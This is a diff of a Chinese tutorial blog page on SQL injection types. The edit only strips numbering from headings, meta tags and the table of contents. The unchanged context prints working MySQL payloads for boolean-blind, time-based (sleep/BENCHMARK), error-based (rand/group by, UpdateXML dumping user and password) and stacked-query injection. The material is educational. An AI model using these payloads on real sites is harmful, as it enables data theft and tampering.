@@ -35,22 +35,22 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="1.基于布尔的盲注mysql&amp;gt; select username from admin where id = 1 and 1=1;
+<meta name="description" content="基于布尔的盲注mysql&amp;gt; select username from admin where id = 1 and 1=1;
 mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内容的真假判断是否存在注入
-2.基于时间的盲注mysql&amp;gt; select username from admin where id">
+基于时间的盲注mysql&amp;gt; select username from admin where id = 1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入练级攻略(5)-5种注入类型">
 <meta property="og:url" content="http://yoursite.com/2015/08/13/SQL注入练级攻略-5-5种注入方式/index.html">
 <meta property="og:site_name" content="FengGe">
-<meta property="og:description" content="1.基于布尔的盲注mysql&amp;gt; select username from admin where id = 1 and 1=1;
+<meta property="og:description" content="基于布尔的盲注mysql&amp;gt; select username from admin where id = 1 and 1=1;
 mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内容的真假判断是否存在注入
-2.基于时间的盲注mysql&amp;gt; select username from admin where id">
-<meta property="og:updated_time" content="2015-08-17T05:26:11.456Z">
+基于时间的盲注mysql&amp;gt; select username from admin where id = 1">
+<meta property="og:updated_time" content="2015-08-17T05:38:45.400Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入练级攻略(5)-5种注入类型">
-<meta name="twitter:description" content="1.基于布尔的盲注mysql&amp;gt; select username from admin where id = 1 and 1=1;
+<meta name="twitter:description" content="基于布尔的盲注mysql&amp;gt; select username from admin where id = 1 and 1=1;
 mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内容的真假判断是否存在注入
-2.基于时间的盲注mysql&amp;gt; select username from admin where id">
+基于时间的盲注mysql&amp;gt; select username from admin where id = 1">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -225,13 +225,13 @@ mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内�
       
 
       
-        <span itemprop="articleBody"><h2 id="1-基于布尔的盲注">1.基于布尔的盲注</h2><pre><code>mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;
+        <span itemprop="articleBody"><h2 id="基于布尔的盲注">基于布尔的盲注</h2><pre><code>mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;
 mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>;<span class="comment">//根据返回内容的真假判断是否存在注入</span>
-</code></pre><h2 id="2-基于时间的盲注">2.基于时间的盲注</h2><pre><code>mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(length<span class="params">(user)</span>&gt;<span class="number">10</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
+</code></pre><h2 id="基于时间的盲注">基于时间的盲注</h2><pre><code>mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(length<span class="params">(user)</span>&gt;<span class="number">10</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
 mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>=<span class="number">114</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
 <span class="comment">//如果if中条件成立返回延时.</span>
 <span class="comment">//BENCHMARK(100000,SHA1('true'))替代sleep(3)，前者在mysql 4/5适用，后者在mysql 5 适用.</span>
-</code></pre><h2 id="3-基于报错的注入">3.基于报错的注入</h2><p>-rand和group的冲突</p>
+</code></pre><h2 id="基于报错的注入">基于报错的注入</h2><p>-rand和group的冲突</p>
 <pre><code>mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat(left(<span class="built_in">rand</span>(),<span class="number">3</span>),version())x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x)b;
 
 mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat_ws(<span class="string">":"</span>,user(),version(),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x) b);
@@ -250,8 +250,8 @@ mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</s
 //a的值为concat(<span class="number">0</span>x7e,(SELECT concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>))
 //对应的也可以替换为concat(<span class="number">0</span>x7e,@@version,<span class="keyword">user</span>(),database())
 </code></pre><p>说明：<br>1.UpdateXML(1,a,1)是一个使用不同的XML标记匹配和替换XML块的函数.<br>2.在a的部分添加目标内容~~如上代码.<br>3.获取内容有长度限制,最长32位。</p>
-<h2 id="4-联合查询注入">4.联合查询注入</h2><p>后面再补</p>
-<h2 id="5-堆查询注入">5.堆查询注入</h2><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
+<h2 id="联合查询注入">联合查询注入</h2><p>后面再补</p>
+<h2 id="堆查询注入">堆查询注入</h2><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
 <pre><code>mysql&gt; <span class="keyword">select</span> @@version;<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)</span>;
 mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> user=root and <span class="number">1</span>=<span class="number">0</span>; <span class="function">insert <span class="title">into</span> (<span class="params">username,password</span>) <span class="title">VALUES</span> (<span class="params"><span class="string">'BobbyTables'</span>, <span class="string">'kl20da$$'</span></span>)</span>;
 <span class="comment">//可以同时执行多个语句</span>
@@ -414,7 +414,7 @@ mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-基于布尔的盲注"><span class="nav-number">1.</span> <span class="nav-text">1.基于布尔的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-基于时间的盲注"><span class="nav-number">2.</span> <span class="nav-text">2.基于时间的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-基于报错的注入"><span class="nav-number">3.</span> <span class="nav-text">3.基于报错的注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-联合查询注入"><span class="nav-number">4.</span> <span class="nav-text">4.联合查询注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-堆查询注入"><span class="nav-number">5.</span> <span class="nav-text">5.堆查询注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基于布尔的盲注"><span class="nav-number">1.</span> <span class="nav-text">基于布尔的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">2.</span> <span class="nav-text">基于时间的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于报错的注入"><span class="nav-number">3.</span> <span class="nav-text">基于报错的注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联合查询注入"><span class="nav-number">4.</span> <span class="nav-text">联合查询注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#堆查询注入"><span class="nav-number">5.</span> <span class="nav-text">堆查询注入</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
